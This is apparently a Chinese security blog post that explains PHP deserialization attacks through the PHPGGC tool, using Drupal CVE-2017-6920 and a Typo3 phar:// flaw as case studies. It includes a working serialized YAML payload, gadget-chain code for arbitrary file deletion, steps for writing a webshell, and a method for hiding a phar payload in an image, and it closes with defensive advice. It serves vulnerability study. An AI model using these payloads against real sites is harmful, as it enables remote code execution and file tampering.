---
title: 由PHPGGC理解PHP反序列化漏洞
date: 2018-10-08 14:43:41
tags: [php,unserialize,drupal,typo3,phpggc]
categories: Security
---

<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>

## 0x01 概述

[PHPGGC](https://github.com/ambionics/phpggc)是一款能够自动生成主流框架的序列化测试`payload`的工具，类似Java中的[ysoserial](https://github.com/frohoff/ysoserial)，当前支持的框架包括`Doctrine`, `Guzzle`, `Laravel`, `Magento`, `Monolog`, `Phalcon`, `Slim`, `SwiftMailer`, `Symfony`, `Yii` 和 `ZendFramework`，可以说是反序列化的武器库了。本文从该工具出发，以Drupal Yaml反序列化漏洞和Typo3反序列化漏洞为例，分析其中的多种利用方式，并介绍一下今年BlackHat议题关于新型php反序列化攻击的部分。

## 0x02 Drupal Yaml反序列化漏洞

### 一、介绍

关于`Drupal`就不过多介绍了，前阵子两个RCE漏洞杀伤力巨大，这次介绍的是去年披露的关于反序列化的漏洞，[CVE-2017-6920](https://nvd.nist.gov/vuln/detail/CVE-2017-6920)，官方描述是YAML解析器处理不当导致的一个远程代码执行漏洞

> ### PECL YAML parser unsafe object handling - Critical - Drupal 8 - CVE-2017-6920
>
> PECL YAML parser does not handle PHP objects safely during certain operations within Drupal core. This could lead to remote code execution. 

详情见[SA-CORE-2017-003](https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple)

### 二、漏洞分析

先来看一下补丁，diff 8.3.3 和 8.3.4 版本，主要修改点在`core/lib/Drupal/Component/Serialization/YamlPecl.php`文件`decode`方法

![1538990057077](https://ob5vt1k7f.qnssl.com/1538990057077.png)

可见在`yaml_parse`前进行了`ini_set('yaml.decode_php', 0);` 

用户可控制的参数`$raw`直接传给了`yaml_parse`函数，而在手册上关于`yaml_parse`函数有这么一个注意点：

```
Warning
Processing untrusted user input with yaml_parse() is dangerous if the use of unserialize() is enabled for nodes using the !php/object tag. This behavior can be disabled by using the yaml.decode_php ini setting.
```

也就是说，如果使用了`yaml`标志`!php/object`，那么这个内容会通过`unserialize()`进行处理，设置`yaml.decode_php`则可以禁止，这就是为什么补丁增加了这行代码。

看一下调用`decode()`方法的地方，`core/lib/Drupal/Component/Serialization/Yaml.php`：

```php
public static function decode($raw) {
    $serializer = static::getSerializer();
    return $serializer::decode($raw);
}
```

在`Yaml`类的`decode()`方法调用了`static::getSerializer()`方法，跟入

![1538993007544](https://ob5vt1k7f.qnssl.com/1538993007544.png)

可以看到加载了`yaml`扩展后就会进入`YamlPecl`类，进而调用`Yaml::decode()`方法，搜索调用`Yaml::decode`并且参数能被控制的地方，在`core/modules/config/src/Form/ConfigSingleImportForm.php`的`validateForm()`方法：

```php
$data = Yaml::decode($form_state->getValue('import'));
```

`validateForm()`的调用处在`http://127.0.0.1/drupal-8.3.3/admin/config/development/configuration/single/import`，`decode()`的参数直接从表单获取，于是通过`import`将恶意参数传递进去。

### 三、漏洞利用

现在我们需要找到一个类，使之在被反序列化的时候执行危险函数，常规搜索`_destruct`、`_tostring`以及`_wakeup`方法，在`drupal`核心中有这么三个类可以被利用，其中两个在`phpggc`工具中已经集成 ，另一个我们手动加入到`phpggc`中

#### 1.  远程代码执行

`vendor/guzzlehttp/psr7/src/FnStream.php` `FnStream`类的`__destruct()`方法

```php
  public function __destruct()
  {
      if (isset($this->_fn_close)) {
          call_user_func($this->_fn_close);
      }
  }
```

我们通过序列化这个类，传递参数`_fn_close`为任意php代码，在`yaml_parse`的时候反序列化便可以造成一个任意代码执行。

在PHPGGC中已经内置这个类，查看信息

![1539050117155](https://ob5vt1k7f.qnssl.com/1539050117155.png)

看一下内部实现

![1539050287387](https://ob5vt1k7f.qnssl.com/1539050287387.png)

`phpggc`将`_fn_close`参数设置为`HandlerStack`类，再在`HandlerStack`序列化的时候传入可控参数`$handler`，而在这个案例中我们不需要额外的`HandlerStack`类了，所以对`generate()`方法稍加修改，直接构造一个`FnStream`类，注意参数是`array`类型：

```php
return new \GuzzleHttp\Psr7\FnStream([
    'close' => $code
]);
```

然后生成序列化数据：

![1539050803329](https://ob5vt1k7f.qnssl.com/1539050803329.png)

接着拼接`YAML_PHP_TAG`即`!php/object`，并且要将字符串转义，注意序列化数据中的空字符，我们将其替换成`\0`，最终生成的字符串如下：

```php
!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"
```

在`http://127.0.0.1/drupal-8.3.3/admin/config/development/configuration/single/import`import序列化后的数据，便可以执行代码

![1539051346096](https://ob5vt1k7f.qnssl.com/1539051346096.png)

![1539051456660](https://ob5vt1k7f.qnssl.com/1539051456660.png)

#### 2.  任意文件写入

上面`call_user_func()`造成了一个任意代码执行，我们再找到一个`file_put_contents()`造成任意文件写入

在`vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php`的`FileCookieJar`类

![1539051809132](https://ob5vt1k7f.qnssl.com/1539051809132.png)

`__destruct()`调用`save()`方法，通过`file_put_contents()`写入文件内容，而文件名和文件内容均是我们可以控制的，所以此处可以写入一个shell

同样地看一下`phpggc`中有关`FileCookieJar`类的部分：`gadgetchains/Guzzle/FW/1/chain.php`

![1539052187458](https://ob5vt1k7f.qnssl.com/1539052187458.png)

通过这个类生成序列化数据

![1539052263375](https://ob5vt1k7f.qnssl.com/1539052263375.png)

需要提供远程文件路径和本地文件路径两个参数

![1539052815893](https://ob5vt1k7f.qnssl.com/1539052815893.png)

接着还是拼接和转义，并import数据

![1539052742894](https://ob5vt1k7f.qnssl.com/1539052742894.png)

写入的是整个json字符串，但是不影响代码执行。

#### 3.  任意文件删除

另一个类是`WindowsPipes`，路径`vendor/symfony/process/Pipes/WindowsPipes.php`，该类可以造成文件删除

![1539053196182](https://ob5vt1k7f.qnssl.com/1539053196182.png)

在`phpggc`中没有内置这个类，于是我们按照这个工具的框架来实现一下，方便理解该工具。

在`lib/PHPGGC/GadgetChain.php`已经有`TYPE_FD`这个类型，代表`file_delete`，那么我们直接在`lib/PHPGGC/GadgetChain/`注册一个`FileDelete`

```php
<?php

namespace PHPGGC\GadgetChain;

abstract class FileDelete extends \PHPGGC\GadgetChain
{
    public static $type = self::TYPE_FD;
    public $parameters = [
        'file_name'
    ];
}
```

这个类就可以作为POP链拿来使用了

然后在`Symfony`目录下创建`RMF/1`，并创建`chain`和`gadgets`

`gadgetchains/Symfony/RMF/1/chain.php`

```php
<?php

namespace GadgetChain\Symfony;

class RMF1 extends \PHPGGC\GadgetChain\FileDelete
{
    public $version = '2.6 <= 2.8.32';
    public $vector = '__destruct';
    public $author = 'crlf';
    public $informations = 'Remove remote file.';

    public function generate(array $parameters)
    {
        $input = $parameters['file_name'];

        return new \Symfony\Component\Process\Pipes\WindowsPipes($input);
    }
}

```

`gadgetchains/Symfony/RMF/1/gadgets.php`

```php
<?php

namespace Symfony\Component\Process\Pipes;


class WindowsPipes
{
    private $files = array();

    public function __construct($input)
    {
        $this->files = array($input);
    }

}
```

我们直接生成`WindowsPipes`的序列化数据，把文件名作为参数传入，在反序列化的时候自动调用`removeFiles()`，实现任意文件删除

![1539053814915](https://ob5vt1k7f.qnssl.com/1539053814915.png)

生成序列化字符串

![1539053942995](https://ob5vt1k7f.qnssl.com/1539053942995.png)

import后文件被删除

![1539054380813](https://ob5vt1k7f.qnssl.com/1539054380813.png)

### 四、总结

通过这个漏洞对`phpgcc`工具有了一定了解，我们可以添加自定义`POP`链到工具中，用来丰富这个武器库。

另外针对这个漏洞，文件写入和文件删除都需要知道网站的绝对路径，加上需要登录后才能利用，一定程度上加大了利用难度。



## 0x03 Typo3反序列化漏洞

### 一、介绍

`Typo3`也是一款著名的CMS，但是在国内流行程度不如`Wordpress`。这个漏洞是今年`BlackHat`大会上由`Sam Thomas`分享反序列化漏洞议题时作为案例来讲的，该漏洞由`phar://`触发，这是一个新型的反序列化利用方式，日常开发中容易忽略这个风险点，在漏洞利用中也用到了`phpgcc`这个工具，所以一并学习。

关于该漏洞的官方描述，可以看[这里](https://typo3.org/security/advisory/typo3-core-sa-2018-002/)

### 二、phar://介绍

在分析漏洞前先介绍一下`phar://`伪协议，直接看php手册的[介绍](http://php.net/manual/en/intro.phar.php)

>Phar archives are best characterized as a convenient way to group several files into a single file. As such, a phar archive provides a way to distribute a complete PHP application in a single file and run it from that file without the need to extract it to disk. Additionally, phar archives can be executed by PHP as easily as any other file, both on the commandline and from a web server. Phar is kind of like a thumb drive for PHP applications. 

简单来说`phar`就是`php`压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被php访问并执行，与`file://` `php://`等类似，也是一种流包装器。

`phar`结构由4部分组成

- `stub`  phar文件标识，格式为 `xxx<?php xxx; __HALT_COMPILER();?>；`
- `manifest`  压缩文件的属性等信息，以**序列化**存储；
- `contents`  压缩文件的内容；
- `signature`  签名，放在文件末尾；

这里有两个关键点，一是文件标识，必须以`__HALT_COMPILER();?>`结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者`pdf`文件来绕过一些上传限制；二是反序列化，`phar`存储的`meta-data`信息以序列化方式存储，当文件操作函数通过`phar://`伪协议解析`phar`文件时就会将数据反序列化，而这样的文件操作函数有很多，包括下面这些：

![1539063733837](https://ob5vt1k7f.qnssl.com/1539063733837.png)

图片来自[seebug](https://paper.seebug.org/680/)

这中间大多数是常用的函数，在一个系统中使用相当广泛，结合文件伪造，使得通过`phar://`解析造成的反序列化攻击变得愈加容易。

### 三、漏洞分析

接下来看一下Typo3中存在漏洞的代码

在`typo3/sysext/core/Classes/Database/SoftReferenceIndex.php`的`getTypoLinkParts()`方法

![1539064169518](https://ob5vt1k7f.qnssl.com/1539064169518.png)

上面说到存在风险的文件操作函数，其中就包括`file_exists()`，当传给`file_exists()`的参数是`phar`压缩文档并通过`phar://`伪协议解析时，就会反序列化其中的`metadata`数据，一旦该数据被控制，就会形成漏洞。

下面举一个例子演示

![1539064567894](https://ob5vt1k7f.qnssl.com/1539064567894.png)

![1539064633273](https://ob5vt1k7f.qnssl.com/1539064633273.png)

可以看到通过`file_exists()`函数判断文件是否存在即对`TestObject`类进行了反序列化。

那么我们可以构造`$splitLinkParam`参数为`phar`文件，其中包含恶意代码，传递给`file_exists()`函数，便会触发漏洞。

### 四、漏洞利用

[pharggc](https://github.com/s-n-t/phpggc)是在`phpgcc`的基础上增加了对`phar`的支持，能够将序列化后的`payload`写入到`phar`文件中，通过`phar://`解析时触发`payload`

我们已经找到可以触发漏洞的地方，但还需要一个类来执行代码，在Typo3中同样存在`FnStream`类，所以我们还是使用`guzzle/rce1`载荷将数据写入一张图片中

![1539065928944](https://ob5vt1k7f.qnssl.com/1539065928944.png)

![1539065937046](https://ob5vt1k7f.qnssl.com/1539065937046.png)

然后上传这个附件，接着创建一个页面，将Link设置为`phar://`，注意需要将`:`转义

![1539067380611](https://ob5vt1k7f.qnssl.com/1539067380611.png)

保存后就会触发漏洞

![1539067384583](https://ob5vt1k7f.qnssl.com/1539067384583.png)

调用栈如下图所示

![1539070664504](https://ob5vt1k7f.qnssl.com/1539070664504.png)

### 五、总结及防御

这个漏洞利用的是`phar`的特性，在系统未过滤`phar://`协议且参数可以控制时，容易引发漏洞，开发时也需要多注意限制使用不必要的流包装器，上传文件也要校验文件内容而不仅仅是文件头。

防范措施

- 限制PHP流包装器的使用(传递)；
- 控制文件操作函数的参数，过滤特殊字符，例如 phar:// 等；
- 仅在特别请求时才对元数据进行反序列化；



## 0x04 总结

本文分析了两个漏洞，并结合`phpggc`工具梳理了反序列化漏洞常见的攻击方式，以及如何寻找一条可以利用的POP链，也提到了开发中容易忽略的安全风险，希望能给大家起到帮助。



参考：

https://paper.seebug.org/334/

https://paper.seebug.org/680

https://github.com/ambionics/phpggc

https://github.com/s-n-t/phpggc

http://php.net/manual/en/function.yaml-parse.php

http://php.net/manual/en/intro.phar.php

https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple

https://typo3.org/security/advisory/typo3-core-sa-2018-002/

